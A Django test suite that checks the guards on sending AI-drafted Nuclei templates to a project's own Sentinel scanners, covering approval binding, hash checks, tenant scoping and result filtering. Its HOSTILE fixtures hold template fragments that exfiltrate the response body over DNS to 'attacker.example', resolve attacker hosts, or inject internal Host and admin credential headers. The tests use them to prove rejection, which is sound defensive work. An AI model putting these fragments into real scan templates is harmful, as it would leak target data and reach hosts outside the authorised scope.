"""AI-written checks run on the owner's own Sentinels (review findings D8, C6; docs/AI-REVIEWER.md).

``nuclei_validate`` (an AI-written draft's syntax check and benign loopback fixture, or an approved template's test) and ``path_probe`` (the scan path
survey) went only to the built-in scanner, so an install that scans only with its own Sentinels never ran them. While the built-in scanner is in use
nothing changes. With none, they go to the project's own Sentinels under these guards, proved here:

- the server never sends a check its gate did not approve (a draft that fails ``templategen.static_check``, a test template that is not an approved
  generated one or read-only), and never sends one that is not read-only or that reaches another port or host to a Sentinel that is not the
  built-in scanner;
- every task names the sha256 of its text; a task whose text and hash disagree (or whose text no longer passes) is never handed out, and the
  Sentinel's separate question (``GET sentinel/tasks/<id>/check``) is answered only for an unchanged, approved check it holds;
- a result that does not name the check it was sent is rejected, an outcome for a host the task did not name is dropped, and a hit whose result
  line names another host is not counted;
- only a Sentinel whose contract version is at least ``external_since`` is offered the kind (``nuclei_validate``: 4, ``path_probe``: 3);
- the path survey a Sentinel ran is kept as that Sentinel's verdict, and its own OS guesses are not believed while its path interferes.

The server reads ``external_since`` from the installed scanner library (cvengine_scanner, the commit pinned in web/requirements.txt), fail closed: with a
library that has no such table nothing here is offered outside the built-in scanner."""
import json
from unittest import mock

from django.test import SimpleTestCase, TestCase
from django.utils import timezone

from agentapi import ai_checks, sentinel_broker, sentinel_contract
from agentapi import sentinel_dispatch as dispatch
from agentapi.models import SentinelTask
from agentapi.services import ApiError, Ctx
from cveFeed import check_allowlist, os_detection, path_probe, templategen, validation
from reNgine import resources
from tests.fake_scanner import FakeScanner
from tests import test_sentinel_v3_kinds as v3

TEMPLATE = v3.NucleiValidateTests.TEMPLATE  # the contract fixture's draft: passes the static gate, read-only, own target
SHA = ai_checks.digest(TEMPLATE)
H = 'id: cve-2099-0001\ninfo:\n  name: c\n  severity: high\n'
NOT_READ_ONLY = H + 'http:\n  - method: POST\n    path: ["{{BaseURL}}/login"]\n    matchers:\n      - type: word\n        words: ["marker-1.2.3"]\n'
OTHER_PORT = H + 'network:\n  - host:\n      - "{{Hostname}}:22"\n    matchers:\n      - type: word\n        words: ["SSH-2.0-OpenSSH_7.2"]\n'
OTHER_HOST = H + 'http:\n  - method: GET\n    path: ["http://other.example.com/x"]\n    matchers:\n      - type: word\n        words: ["marker-1.2.3"]\n'
HOSTS = ['https://www.rt.test', 'https://api.rt.test']


def echo(outcomes=None, **fields):
    """A responder that answers like a contract-4 Sentinel: the hash it was sent, and ``outcomes`` (a function of the targets) for a test."""
    def answer(task):
        target = task['target']
        out = {'outcome': 'done', 'template_sha256': target['template_sha256'], **fields}
        if target['mode'] == 'validate':
            out.update(valid=True, output='ok', fixture_ok=True, fixture_note='no match on benign local fixture')
        else:
            out['outcomes'] = outcomes(target['targets']) if outcomes else [{'host': h, 'vulnerable': False, 'output': ''} for h in target['targets']]
        return out
    return answer


class Base(v3.StageBase):
    def setUp(self):
        super().setUp()
        # the approval records a check for a Sentinel other than the built-in scanner is bound to (review D3): TEMPLATE is the AI's draft for a CVE
        # matched on a host of this project, and the same text is also a promoted (valid, fixture-reviewed) check; HOSTS are this project's hosts
        from cveFeed.models import CVEEntry, CVEMatch, GeneratedTemplate
        from startScan.models import Subdomain
        self.cve = CVEEntry.objects.create(cve_id='CVE-2024-0001')
        self.subs = [Subdomain.objects.create(name=name, target_domain=self.domain) for name in ('www.rt.test', 'api.rt.test')]
        CVEMatch.objects.create(cve_entry=self.cve, subdomain=self.subs[0])
        self.draft = GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=TEMPLATE,
                                                      status=GeneratedTemplate.STATUS_DRAFT)
        self.promoted = GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=TEMPLATE,
                                                         status=GeneratedTemplate.STATUS_VALID, positive_fixture_verified_at=timezone.now(),
                                                         positive_fixture_source='reviewed fixture')

    def external(self, kinds=('nuclei_validate', 'path_probe'), **kw):
        return FakeScanner(kinds=list(kinds), external=True, name=kw.pop('name', 'own-sentinel'), **kw).start_for(self)

    def builtin(self, kinds=('nuclei_validate', 'path_probe'), **kw):
        return FakeScanner(kinds=list(kinds), **kw).start_for(self)

    def queued(self, target, **kw):
        return SentinelTask.objects.create(project=self.project, kind='nuclei_validate', target=target, **kw)

    def ctx(self, fake):
        return Ctx(user=fake.agent.token.user, token=fake.agent.token)

    def claim(self, fake):
        return sentinel_broker.next_task(self.ctx(fake), {'kinds': ['nuclei_validate'], 'wait': 0})['task']


# ============================================================================== which Sentinel is offered the kinds

class RoutingTests(Base):
    def test_an_install_with_no_builtin_scanner_dispatches_a_draft_check_to_a_project_sentinel(self):
        self.arm('nuclei_validate')
        fake = self.external(responders={'nuclei_validate': echo()})
        dispatch.nuclei_validate_ready(self.project)  # does not raise: the AI may be asked for a draft
        valid, output = templategen.validate_anywhere(TEMPLATE, self.project)
        self.assertTrue(valid, output)
        self.assertEqual(fake.served[0]['target'], {'mode': 'validate', 'template': TEMPLATE, 'template_sha256': SHA})
        self.assertFalse(sentinel_broker.is_builtin(fake.agent))

    def test_a_draft_with_no_project_is_filed_under_a_project_that_has_such_a_sentinel(self):
        from dashboard.models import Project
        Project.objects.create(name='Older', slug='aaa-older', insert_date=timezone.now(), org=self.project.org)  # no Sentinel covers it
        fake = self.external(responders={'nuclei_validate': echo()}, scope={'orgs': [], 'projects': [self.project.slug], 'hosts': []})
        dispatch.nuclei_validate_ready(None)
        valid, _output = templategen.validate_anywhere(TEMPLATE, None)
        self.assertTrue(valid)
        self.assertEqual(fake.tasks()[0].project_id, self.project.id)

    def test_an_install_with_no_builtin_scanner_tests_an_approved_check_on_the_hosts_own_project_sentinel(self):
        self.arm('nuclei_validate')

        def outcomes(targets):
            return [{'host': targets[0], 'vulnerable': True, 'output': '{}', 'hit': {'matcher-name': 'word', 'matched-at': targets[0] + '/x'}},
                    {'host': targets[1], 'vulnerable': False, 'output': ''}]
        fake = self.external(responders={'nuclei_validate': echo(outcomes)})
        out = dispatch.try_template_test(TEMPLATE, HOSTS, self.project.id)
        self.assertEqual(fake.served[0]['target'], {'mode': 'test', 'template': TEMPLATE, 'template_sha256': SHA, 'targets': HOSTS})
        self.assertEqual(fake.tasks()[0].project_id, self.project.id)
        self.assertEqual([o['vulnerable'] for o in out], [True, False])
        self.assertNotIn('error', out[1])

    def test_while_the_builtin_scanner_is_in_use_both_kinds_stay_on_it(self):
        own = self.builtin()
        outside = self.external()
        for kind in ('nuclei_validate', 'path_probe'):
            with self.subTest(kind=kind):
                task = SentinelTask.objects.create(project=self.project, kind=kind, target={})
                self.assertEqual(sentinel_broker.effective(outside.agent).refusal(task), ('capability', sentinel_broker.BUILTIN))
                self.assertIsNone(sentinel_broker.effective(own.agent).refusal(task))
                task.delete()  # only asked about, never meant to run
        valid, _ = templategen.validate_anywhere(TEMPLATE, self.project)
        self.assertTrue(valid)
        self.assertEqual((len(own.served), len(outside.served)), (1, 0))

    def test_a_sentinel_older_than_contract_four_is_never_offered_a_check(self):
        self.external(contract_version=3)
        self.assertFalse(dispatch.any_scanner_for(self.project, 'nuclei_validate'))
        with self.assertRaises(resources.ScannerUnavailable):
            dispatch.nuclei_validate_ready(self.project)
        self.assertTrue(dispatch.any_scanner_for(self.project, 'path_probe'))  # nothing in the survey is new: contract 3 runs it as 4 does

    def test_the_signed_in_route_check_stays_with_the_builtin_scanner(self):
        self.external(kinds=['route_probe_signed', 'nuclei_validate'])
        self.assertFalse(dispatch.any_scanner_for(self.project, 'route_probe_signed'))
        self.assertTrue(dispatch.any_scanner_for(self.project, 'nuclei_validate'))

    def test_a_server_whose_library_has_no_external_table_offers_neither_kind_outside(self):
        self.external()
        with mock.patch.object(sentinel_contract, 'external_since', return_value=None):
            self.assertFalse(dispatch.any_scanner_for(self.project, 'nuclei_validate'))
            self.assertFalse(dispatch.any_scanner_for(self.project, 'path_probe'))


# ============================================================================== the server never sends an unapproved check

class NeverSentTests(Base):
    def assertNothingSent(self):
        self.assertFalse(SentinelTask.objects.filter(kind='nuclei_validate').exists())

    def test_a_draft_that_fails_the_static_gate_is_never_sent_to_the_builtin_scanner(self):
        self.builtin()
        self.assertDraftRefused()

    def test_a_draft_that_fails_the_static_gate_is_never_sent_to_a_sentinel(self):
        self.external()
        self.assertDraftRefused()

    def assertDraftRefused(self):
        valid, output = templategen.validate_anywhere(NOT_READ_ONLY, self.project)
        self.assertFalse(valid)
        self.assertIn('not validated', output)
        self.assertNothingSent()

    def test_a_test_template_the_server_did_not_approve_is_never_sent_to_any_scanner(self):
        self.builtin()
        with mock.patch.object(validation, 'all_templates_allowed', return_value=False):
            out = dispatch.try_template_test(NOT_READ_ONLY, HOSTS, self.project.id)
        self.assertNothingSent()
        self.assertTrue(all(o['error'].startswith('not tested: template not validated') for o in out), out)

    def test_a_template_that_is_not_read_only_never_goes_outside_the_builtin_scanner(self):
        self.external()
        with mock.patch.object(validation, 'all_templates_allowed', return_value=True):  # Settings allows every installed template
            out = dispatch.try_template_test(NOT_READ_ONLY, HOSTS, self.project.id)
        self.assertNothingSent()
        self.assertTrue(all('not tested' in o['error'] and 'read-only' in o['error'] for o in out), out)

    def test_the_builtin_scanner_still_runs_an_installed_template_the_setting_allows(self):
        own = self.builtin(responders={'nuclei_validate': echo()})
        with mock.patch.object(validation, 'all_templates_allowed', return_value=True):
            out = dispatch.try_template_test(NOT_READ_ONLY, HOSTS, self.project.id)
        self.assertEqual(len(own.served), 1)
        self.assertEqual([o.get('error', '') for o in out], ['', ''])

    def test_a_check_aimed_at_another_port_or_host_never_goes_to_a_sentinel(self):
        self.external()
        for text in (OTHER_PORT, OTHER_HOST):
            with self.subTest(text=text[-60:]):
                out = dispatch.try_template_test(text, HOSTS, self.project.id)
                self.assertTrue(all(o['error'].startswith('not tested') for o in out), out)
                valid, output = dispatch.try_nuclei_validate(text, self.project)[:2]
                self.assertFalse(valid)
                self.assertIn('not validated', output)
                self.assertNothingSent()

    def test_every_check_task_names_the_hash_of_its_own_text(self):
        own = self.builtin(responders={'nuclei_validate': echo()})
        templategen.validate_anywhere(TEMPLATE, self.project)
        dispatch.try_template_test(TEMPLATE, HOSTS, self.project.id)
        targets = [t.target for t in SentinelTask.objects.filter(kind='nuclei_validate')]
        self.assertEqual(len(targets), 2)
        for target in targets:
            self.assertEqual(target['template_sha256'], ai_checks.digest(target['template']))
        self.assertEqual(len(own.served), 2)


# ============================================================================== hand-out and the Sentinel's separate question

class HandOutTests(Base):
    def target(self, text=TEMPLATE, sha=SHA, mode='validate'):
        out = {'mode': mode, 'template': text, 'template_sha256': sha}
        return {**out, 'targets': HOSTS} if mode == 'test' else out

    def test_a_task_altered_after_dispatch_or_not_approved_is_never_handed_to_a_sentinel(self):
        fake = self.external()
        cases = {'altered text': self.target(text=TEMPLATE.replace('example-banner', 'other-banner')),
                 'no hash': {'mode': 'validate', 'template': TEMPLATE},
                 'not read-only': self.target(text=NOT_READ_ONLY, sha=ai_checks.digest(NOT_READ_ONLY), mode='test'),
                 'another port': self.target(text=OTHER_PORT, sha=ai_checks.digest(OTHER_PORT), mode='test')}
        for name, target in cases.items():
            with self.subTest(case=name):
                task = self.queued(target)
                self.assertIsNone(self.claim(fake))
                task.refresh_from_db()
                self.assertEqual(task.status, 'expired')
                self.assertIn('cancelled', task.error)

    def test_a_check_that_names_a_stored_sign_in_is_never_handed_outside(self):
        fake = self.external()
        task = self.queued(self.target(), secret_ref='authcred:1')
        self.assertIsNone(self.claim(fake))
        self.assertNotEqual(SentinelTask.objects.get(pk=task.pk).agent_id, fake.agent.pk)

    def test_the_sentinel_holding_an_approved_check_is_told_its_hash(self):
        fake = self.external()
        task = self.queued(self.target())
        self.assertEqual(self.claim(fake)['id'], task.pk)
        self.assertEqual(sentinel_broker.approved_check(self.ctx(fake), task.pk), {'task_id': task.pk, 'template_sha256': SHA, 'mode': 'validate',
                                                                                    'targets': []})

    def test_no_answer_for_a_task_not_held_altered_or_of_another_sentinel(self):
        fake = self.external()
        other = self.external(name='someone-else')
        held = self.queued(self.target())
        self.assertEqual(self.claim(fake)['id'], held.pk)
        queued = self.queued(self.target())
        with self.assertRaises(ApiError) as caught:
            sentinel_broker.approved_check(self.ctx(other), held.pk)  # held by another Sentinel
        self.assertEqual(caught.exception.status, 404)
        with self.assertRaises(ApiError):
            sentinel_broker.approved_check(self.ctx(fake), queued.pk)  # not claimed by it
        SentinelTask.objects.filter(pk=held.pk).update(target=self.target(text=TEMPLATE + '\n# changed\n'))  # the stored text changed under it
        with self.assertRaises(ApiError) as caught:
            sentinel_broker.approved_check(self.ctx(fake), held.pk)
        self.assertEqual(caught.exception.status, 404)

    def test_a_sentinel_token_reaches_the_route_over_http(self):
        from django.test import Client
        from agentapi.auth import SCOPE_SENTINEL, create_token
        fake = self.external()
        token, raw = create_token(fake.agent.token.user, 'aival-http', scope=SCOPE_SENTINEL)
        fake.agent.token = token
        fake.agent.save(update_fields=['token'])
        task = self.queued(self.target())
        self.assertEqual(self.claim(fake)['id'], task.pk)
        response = Client().get(f'/api/v1/sentinel/tasks/{task.pk}/check', HTTP_AUTHORIZATION=f'Bearer {raw}')
        self.assertEqual(response.status_code, 200, response.content[:300])
        self.assertEqual(response.json()['template_sha256'], SHA)
        other = self.queued(self.target())
        self.assertEqual(Client().get(f'/api/v1/sentinel/tasks/{other.pk}/check', HTTP_AUTHORIZATION=f'Bearer {raw}').status_code, 404)

    def test_the_route_is_published(self):
        from agentapi import rest
        self.assertTrue(any(method == 'GET' and pattern == r'sentinel/tasks/(?P<task_id>\d+)/check' for method, pattern, *_ in rest.ROUTES))


# ============================================================================== results held to the task

class ResultTests(Base):
    def test_an_external_result_that_does_not_name_the_check_it_was_sent_is_rejected(self):
        fake = self.external()
        good = {'outcome': 'done', 'valid': True, 'output': 'ok', 'fixture_ok': True, 'fixture_note': 'no match'}
        for name, body in (('another hash', {**good, 'template_sha256': 'b' * 64}), ('no hash', good)):
            with self.subTest(case=name):
                task = self.queued({'mode': 'validate', 'template': TEMPLATE, 'template_sha256': SHA})
                self.assertEqual(self.claim(fake)['id'], task.pk)
                sentinel_broker.accept_task(self.ctx(fake), task.pk)
                with self.assertRaises(ApiError) as caught:
                    sentinel_broker.report_result(self.ctx(fake), task.pk, body)
                self.assertEqual(caught.exception.status, 400)
                task.refresh_from_db()
                self.assertEqual(task.status, 'failed')
                self.assertIn('rejected', task.error)
                self.assertFalse(task.result)  # nothing of it kept

    def test_a_hit_that_names_another_host_or_an_unasked_host_is_not_counted(self):
        def outcomes(targets):
            return [{'host': targets[0], 'vulnerable': True, 'output': '{}', 'hit': {'matcher-name': 'word', 'matched-at': 'https://198.51.100.9/x'}},
                    {'host': targets[1], 'vulnerable': True, 'output': '{}', 'hit': {'matcher-name': 'word', 'host': 'https://api.rt.test'}},
                    {'host': 'https://elsewhere.example.test', 'vulnerable': True, 'output': '', 'hit': {'matcher-name': 'word'}}]
        self.external(responders={'nuclei_validate': echo(outcomes)})
        out = dispatch.try_template_test(TEMPLATE, HOSTS, self.project.id)
        self.assertFalse(out[0]['vulnerable'])
        self.assertIn('another host', out[0]['error'])
        self.assertTrue(out[1]['vulnerable'])
        self.assertEqual(len(out), 2)
        stored = SentinelTask.objects.get(kind='nuclei_validate').result
        self.assertNotIn('elsewhere.example.test', json.dumps(stored))
        self.assertNotIn('198.51.100.9', json.dumps(stored))

    def test_a_builtin_result_with_no_hash_is_still_taken(self):
        self.builtin(responders={'nuclei_validate': {'outcome': 'done', 'valid': True, 'output': '', 'fixture_ok': True, 'fixture_note': 'ok'}})
        valid, _output = templategen.validate_anywhere(TEMPLATE, self.project)
        self.assertTrue(valid)


# ============================================================================== the path survey, per Sentinel

class PathSurveyTests(Base):
    TARGETS = v3.PathProbeTests.TARGETS

    def survey(self, rows):
        fake = self.external(kinds=['path_probe'], contract_version=3, responders={'path_probe': {'outcome': 'done', 'results': rows}})
        with mock.patch.object(path_probe, 'candidates', return_value=self.TARGETS), mock.patch.object(path_probe, 'holder', return_value=self.project.id):
            return fake, path_probe.check()

    def test_with_no_builtin_scanner_the_survey_runs_on_the_projects_sentinel_and_is_kept_as_its_verdict(self):
        self.arm('path_probe')
        before = os_detection.path_state()
        fake, out = self.survey([{'ip': ip, 'port': port, 'plain': True, 'odd': False} for ip, port in self.TARGETS])
        self.assertEqual(len(fake.served), 1)
        self.assertEqual(out['sentinels'], {str(fake.agent.pk): 'interfering'})
        self.assertEqual(out['vantage'], 'sentinels')
        self.assertEqual(os_detection.sentinel_path_state(fake.agent.pk)['state'], 'interfering')
        self.assertEqual(os_detection.path_state(), before)  # the install-wide verdict is the built-in scanner's alone
        os_detection.record_path(out)  # what the daily task does with it
        self.assertEqual(os_detection.path_state()['state'], before['state'])
        self.assertEqual(os_detection.status()['path']['sentinels'], {str(fake.agent.pk): 'interfering'})  # shown, per Sentinel

    def test_an_os_guess_from_a_sentinel_whose_path_interferes_is_not_believed(self):
        fake, _out = self.survey([{'ip': ip, 'port': port, 'plain': True, 'odd': False} for ip, port in self.TARGETS])
        self.assertFalse(dispatch.os_reliable(dispatch.Result({'os_reliable': True}, agent_id=fake.agent.pk)))
        other, _ = self.survey([{'ip': ip, 'port': port, 'plain': True, 'odd': True} for ip, port in self.TARGETS])
        self.assertTrue(dispatch.os_reliable(dispatch.Result({'os_reliable': True}, agent_id=other.agent.pk)))
        self.assertFalse(dispatch.os_reliable(dispatch.Result({'os_reliable': False}, agent_id=other.agent.pk)))


# ============================================================================== second security pass (review D1, D3, D4, D7, D8)

class AllowlistNeverSentTests(Base):
    """D1, D2: a draft that passes the static gate and the read-only rules but breaks the whole-document allowlist never becomes a task for a
    Sentinel, and a task holding one is never handed out (the broker checks again)."""
    TAIL = '\n    matchers:\n      - type: word\n        words:\n          - "example-banner"'
    HOSTILE = {
        'resolve_in_header': '\n    headers:\n      X-A: "{{resolve(\'x.attacker.example\',\'a\')}}"',
        'nested_resolve_in_header': '\n    headers:\n      X-A: "{{to_lower(concat(\'a\', resolve(\'x.attacker.example\',\'a\')))}}"',
        'resolve_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "resolve(concat(hex_encode(body), \'.attacker.example\'), \'a\')"',
        'jarm_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "jarm(\'192.0.2.1:443\')"',
        'host_header': '\n    headers:\n      Host: internal.corp.local',
        'authorization_header': '\n    headers:\n      Authorization: "Basic YWRtaW46YWRtaW4="',
        'duplicate_key': '\n    method: GET',
    }

    def hostile(self):
        from cveFeed.models import GeneratedTemplate
        texts = {}
        for name, extra in self.HOSTILE.items():
            text = TEMPLATE[:TEMPLATE.index('\n    matchers:')] + extra + self.TAIL
            GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=text, status=GeneratedTemplate.STATUS_DRAFT)
            ok, why = templategen.static_check(text)
            self.assertTrue(ok, f'{name}: {why}')  # the old gates pass it: the allowlist is what refuses it
            self.assertEqual(validation.readonly_problem(text), '', name)
            texts[name] = text
        return texts

    def test_a_hostile_draft_is_never_sent_to_a_sentinel(self):
        fake = self.external(responders={'nuclei_validate': echo()})
        for name, text in self.hostile().items():
            with self.subTest(case=name):
                valid, output, _fixture, _note = dispatch.try_nuclei_validate(text, self.project)
                self.assertFalse(valid)
                self.assertIn('not validated', output)
        self.assertFalse(SentinelTask.objects.filter(kind='nuclei_validate').exists())
        self.assertEqual(fake.served, [])

    def test_a_task_holding_one_is_never_handed_out(self):
        fake = self.external()
        for name, text in self.hostile().items():
            with self.subTest(case=name):
                task = self.queued({'mode': 'validate', 'template': text, 'template_sha256': ai_checks.digest(text)})
                self.assertIsNone(self.claim(fake))
                task.refresh_from_db()
                self.assertEqual(task.status, 'expired')


class ApprovalBindingTests(Base):
    """D3: for a Sentinel other than the built-in scanner a check is sent and handed out only while an approval record holds exactly its text, for
    the task's own tenant and hosts; arbitrary read-only text and a withdrawn approval never are."""
    ROGUE = TEMPLATE.replace('example-banner', 'rogue-banner')  # read-only, own target, on the allowlist: but no row or file approves it

    def test_read_only_text_no_record_approves_is_never_sent_or_handed_out(self):
        fake = self.external(responders={'nuclei_validate': echo()})
        self.assertEqual(ai_checks.external_problem(self.ROGUE), '')
        out = dispatch.try_template_test(self.ROGUE, HOSTS, self.project.id)
        self.assertTrue(all('no approval holds exactly this text' in o['error'] for o in out), out)
        valid, output = templategen.validate_anywhere(self.ROGUE, self.project)
        self.assertFalse(valid)
        self.assertIn('no AI draft holds exactly this text', output)
        self.assertEqual(fake.served, [])
        for mode in ('validate', 'test'):
            with self.subTest(mode=mode):
                task = self.queued(ai_checks.target(mode, self.ROGUE, HOSTS))
                self.assertIsNone(self.claim(fake))
                task.refresh_from_db()
                self.assertEqual(task.status, 'expired')
                self.assertIn('no ', task.error)

    def test_a_check_whose_approval_was_withdrawn_after_dispatch_is_never_handed_out(self):
        from cveFeed.models import GeneratedTemplate
        fake = self.external()
        for mode, row in (('test', self.promoted), ('validate', self.draft)):
            with self.subTest(mode=mode):
                task = self.queued(ai_checks.target(mode, TEMPLATE, HOSTS))
                self.assertEqual(ai_checks.task_problem(task, builtin=False), '')  # approved when it was made
                GeneratedTemplate.objects.filter(pk=row.pk).update(status=GeneratedTemplate.STATUS_INVALID)  # withdrawn before it was claimed
                self.assertIsNone(self.claim(fake))
                task.refresh_from_db()
                self.assertEqual(task.status, 'expired')

    def test_the_answer_is_withdrawn_with_the_approval_while_the_sentinel_holds_the_check(self):
        from cveFeed.models import GeneratedTemplate
        fake = self.external()
        task = self.queued(ai_checks.target('test', TEMPLATE, HOSTS))
        self.assertEqual(self.claim(fake)['id'], task.pk)
        self.assertEqual(sentinel_broker.approved_check(self.ctx(fake), task.pk)['targets'], sorted(HOSTS))
        GeneratedTemplate.objects.filter(pk=self.promoted.pk).update(status=GeneratedTemplate.STATUS_INVALID)
        with self.assertRaises(ApiError) as caught:
            sentinel_broker.approved_check(self.ctx(fake), task.pk)
        self.assertEqual(caught.exception.status, 404)

    def test_a_test_check_runs_only_on_hosts_of_its_own_project(self):
        fake = self.external(responders={'nuclei_validate': echo()})
        out = dispatch.try_template_test(TEMPLATE, ['https://www.rt.test', 'https://elsewhere.example.test'], self.project.id)
        self.assertTrue(all('is not a host of the project' in o['error'] for o in out), out)
        self.assertEqual(fake.served, [])
        task = self.queued(ai_checks.target('test', TEMPLATE, ['https://www.rt.test', 'https://elsewhere.example.test']))  # targets edited
        self.assertIsNone(self.claim(fake))
        task.refresh_from_db()
        self.assertEqual(task.status, 'expired')

    def test_a_draft_is_checked_only_for_a_project_that_owns_a_target_of_its_cve(self):
        from cveFeed.models import CVEMatch
        self.external(responders={'nuclei_validate': echo()})
        CVEMatch.objects.all().delete()  # the draft's CVE matched no host of this project
        with self.assertRaises(resources.ScannerUnavailable):
            dispatch.try_nuclei_validate(TEMPLATE, self.project)
        task = self.queued(ai_checks.target('validate', TEMPLATE))
        self.assertIn('not for a target of the project', ai_checks.task_problem(task, builtin=False))

    def test_an_installed_template_file_is_an_approval_of_exactly_its_text(self):
        import os
        import tempfile
        installed = TEMPLATE.replace('cve-2024-0001-example', 'CVE-2024-0002')
        with tempfile.TemporaryDirectory() as root:
            path = os.path.join(root, 'CVE-2024-0002.yaml')
            with open(path, 'w', encoding='utf-8') as handle:
                handle.write(installed)
            with mock.patch.object(templategen, 'find_existing_template', return_value=[path]), \
                    mock.patch.object(templategen, 'TEMPLATES_ROOT', root), mock.patch.object(validation, 'all_templates_allowed', return_value=False):
                self.assertEqual(ai_checks.binding_problem('test', installed, self.project.id, HOSTS), '')
                self.assertIn('no approval', ai_checks.binding_problem('test', installed + '# edited\n', self.project.id, HOSTS))
                os.unlink(path)  # removed from the template directory: withdrawn
                self.assertIn('no approval', ai_checks.binding_problem('test', installed, self.project.id, HOSTS))


class TenantRoutingTests(Base):
    """D7, D8: a draft goes only to a Sentinel of a project that owns a target of its CVE, never to another tenant's (the oldest project's Sentinel
    included); with none it waits. A test check of one tenant is never handed to another tenant's Sentinel."""

    def other_tenant(self):
        from dashboard.models import Org, Project
        org = Org.objects.create(name='Other', slug='other-org')
        return Project.objects.create(name='Older', slug='aaa-older', insert_date=timezone.now(), org=org)

    def test_with_no_project_a_draft_never_goes_to_another_tenants_sentinel(self):
        older = self.other_tenant()  # the oldest project, with its own Sentinel, and no target of the draft's CVE
        theirs = self.external(name='their-sentinel', responders={'nuclei_validate': echo()},
                               scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
        with self.assertRaises(resources.ScannerUnavailable):
            dispatch.try_nuclei_validate(TEMPLATE, None)  # the owning project has no Sentinel: it waits
        self.assertEqual(theirs.served, [])
        ours = self.external(name='our-sentinel', responders={'nuclei_validate': echo()},
                             scope={'orgs': [], 'projects': [self.project.slug], 'hosts': []})
        valid, _output, _fixture, _note = dispatch.try_nuclei_validate(TEMPLATE, None)
        self.assertTrue(valid)
        self.assertEqual((len(ours.served), len(theirs.served)), (1, 0))
        self.assertEqual(SentinelTask.objects.get(kind='nuclei_validate').project_id, self.project.id)

    def test_a_draft_named_for_another_tenant_is_not_filed_there(self):
        older = self.other_tenant()
        theirs = self.external(name='their-sentinel', responders={'nuclei_validate': echo()},
                               scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
        with self.assertRaises(resources.ScannerUnavailable):
            dispatch.try_nuclei_validate(TEMPLATE, older)
        self.assertEqual(theirs.served, [])

    def test_another_tenants_sentinel_is_never_handed_a_check_of_this_project(self):
        older = self.other_tenant()
        theirs = self.external(name='their-sentinel', scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
        for mode in ('validate', 'test'):
            with self.subTest(mode=mode):
                task = self.queued(ai_checks.target(mode, TEMPLATE, HOSTS))
                self.assertEqual(sentinel_broker.effective(theirs.agent).refusal(task)[0], 'scope')
                self.assertIsNone(self.claim(theirs))
                task.delete()
        out = dispatch.try_template_test(TEMPLATE, HOSTS, self.project.id)
        self.assertTrue(all(o.get('error') for o in out), out)  # nobody could take it: not tested, stays due
        self.assertEqual(theirs.served, [])


class DraftRowTests(Base):
    """D3: a new AI draft is a row before its first check, so the check a Sentinel runs is bound to that row; a draft whose first check never
    finished is checked again by the automatic validator."""

    def test_the_first_check_of_a_new_draft_runs_on_its_own_row(self):
        from cveFeed import templatevalidate
        from cveFeed.models import AIJob, GeneratedTemplate
        GeneratedTemplate.objects.all().delete()
        fake = self.external(responders={'nuclei_validate': echo()})
        job = AIJob.objects.create(kind='template_generation', dedupe='t', context={'cve': self.cve.pk, 'project': self.project.id})
        seen = {}
        real = dispatch.try_nuclei_validate

        def spy(text, project=None):
            seen['rows'] = list(GeneratedTemplate.objects.filter(yaml=text).values_list('status', 'validation_stage'))
            return real(text, project)
        with mock.patch.object(dispatch, 'try_nuclei_validate', side_effect=spy):
            templategen.job_answer(job, TEMPLATE)
        self.assertEqual(seen['rows'], [(GeneratedTemplate.STATUS_DRAFT, 'syntax')])
        row = GeneratedTemplate.objects.get()
        self.assertEqual((row.status, row.validation_stage, row.validation_next_at), (GeneratedTemplate.STATUS_DRAFT, '', None))
        self.assertEqual(len(fake.served), 1)
        row.validation_stage = 'syntax'
        row.save(update_fields=['validation_stage'])
        with mock.patch.object(templatevalidate, '_sentinel_gate', return_value='retry') as gate:
            self.assertEqual(templatevalidate.step(row), 'retry')
        gate.assert_called_once()


# ============================================================================== one read-only rule on both sides

class SameVerdictTests(SimpleTestCase):
    def test_the_server_and_the_sentinel_judge_every_corpus_template_alike(self):
        from cvengine_scanner import checks
        from cvengine_scanner import contract as library
        corpus = json.loads((library.FIXTURES / 'checks' / 'corpus.json').read_text(encoding='utf-8'))['cases']
        self.assertGreaterEqual(len(corpus), 30)
        for case in corpus:
            with self.subTest(case=case['name']):
                self.assertEqual(validation.readonly_problem(case['template']) == '', case['read_only'])
                self.assertEqual(checks.readonly_problem(case['template']) == '', case['read_only'])
                self.assertEqual(ai_checks.external_problem(case['template']) == '', case['read_only'] and case['own_target'] and case['sentinel'])
                self.assertEqual(checks.check_problem(case['template']) == '', case['read_only'] and case['own_target'] and case['sentinel'])
                self.assertEqual(check_allowlist.allowlist_problem(case['template']) == '' or not case['sentinel'], True)

    def test_the_server_and_the_sentinel_allow_the_same_names_keys_and_headers(self):
        from cvengine_scanner import check_allowlist as library
        for name in ('TOP_KEYS', 'INFO_KEYS', 'CLASSIFICATION_KEYS', 'BLOCK_KEYS', 'INPUT_KEYS', 'MATCHER_KEYS', 'MATCHER_TYPES', 'EXTRACTOR_KEYS',
                     'EXTRACTOR_TYPES', 'METHODS', 'DNS_TYPES', 'TLS_VERSIONS', 'PLACEHOLDERS', 'RESPONSE_NAMES', 'PARTS', 'FUNCTIONS', 'LITERALS',
                     'FORBIDDEN_HEADERS', 'MAX_HEADERS', 'MAX_EXPRESSION'):
            with self.subTest(table=name):
                self.assertEqual(getattr(check_allowlist, name), getattr(library, name))

    def test_no_hostile_case_reaches_a_sentinel_from_the_server(self):
        from cvengine_scanner import contract as library
        corpus = json.loads((library.FIXTURES / 'checks' / 'corpus.json').read_text(encoding='utf-8'))['cases']
        hostile = [c for c in corpus if c['read_only'] and c['own_target'] and not c['sentinel']]
        self.assertGreaterEqual(len(hostile), 40)
        for case in hostile:
            with self.subTest(case=case['name']):
                self.assertTrue(ai_checks.external_problem(case['template']).startswith('template not validated: '))
